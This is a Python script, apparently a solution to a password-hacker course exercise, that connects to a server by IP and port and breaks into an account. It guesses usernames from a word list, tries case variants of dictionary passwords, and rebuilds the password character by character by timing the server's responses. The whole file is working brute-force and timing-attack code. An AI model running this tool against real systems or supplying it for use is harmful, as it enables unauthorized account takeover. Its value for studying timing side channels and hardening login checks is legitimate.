import argparse
import socket
import itertools
import os
import json
import string
import time


def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('IP_adress')
    parser.add_argument('port')
    args = parser.parse_args()
    IP_adress = args.IP_adress
    port = int(args.port)
    connect_server(IP_adress, port)


def connect_server(IP, port):
    global new_socket
    new_socket = socket.socket()
    hostname = (IP, port)
    new_socket.connect(hostname)


def get_pwd():
    """try combination of possibilities in each example given. Used in first stages"""
    file = 'passwords.txt'
    filepath = os.path.join(os.getcwd(), file)
    if os.path.exists(filepath):
        with open(filepath, 'r', encoding='utf-8') as file:
            file_read = file.readlines()
            for i in file_read:
                # print(i.strip())
                password = i.strip()
                yield from map(lambda x: ''.join(x),
                               itertools.product(*([letter.lower(), letter.upper()] for letter in password)))


def get_password_from_gen(generator):
    """use the iterator built in prev fx. Used in first stage"""
    while True:
        msg = str(next(generator)).encode()
        new_socket.send(msg)
        response = new_socket.recv(1024)
        response = response.decode()
        if response == "Connection success!":
            password = msg.decode()
            print(password)
            exit()


def finding_login():
    """get login from file, send it as json until it`s found"""
    pwd = ''
    characters = string.ascii_letters + string.digits
    log_pass_dict = \
        {
            "login": '',
            "password": '',
        }

    with open('logins.txt', 'r', encoding='utf-8') as logins:
        file = logins.readlines()
        for i in file:
            log_pass_dict['login'] = i.strip()
            # print(log_pass_dict)
            # print(json_log)
            msg_login = json.dumps(log_pass_dict).encode()
            new_socket.send(msg_login)
            response = json.loads(new_socket.recv(1024).decode())
            if response['result'] == "Wrong password!":
                # print(msg_login.decode())
                while True:

                    for letter in characters:
                        log_pass_dict['password'] += letter
                        msg_login = json.dumps(log_pass_dict).encode()
                        initial_time = time.time()
                        new_socket.send(msg_login)
                        response = json.loads(new_socket.recv(1024).decode())
                        end_time = time.time()
                        time_passed = end_time - initial_time
                        if response['result'] == "Connection success!":
                            print(msg_login.decode())
                            exit()
                        elif time_passed >= 0.1:
                            # print('EXCEPTION')
                            pwd += letter
                            log_pass_dict['password'] = pwd
                            continue
                        else:
                            log_pass_dict['password'] = pwd
                            continue
            elif response['result'] == "Wrong login!":
                continue


def main():
    arguments()
    finding_login()


if __name__ == '__main__':
    main()
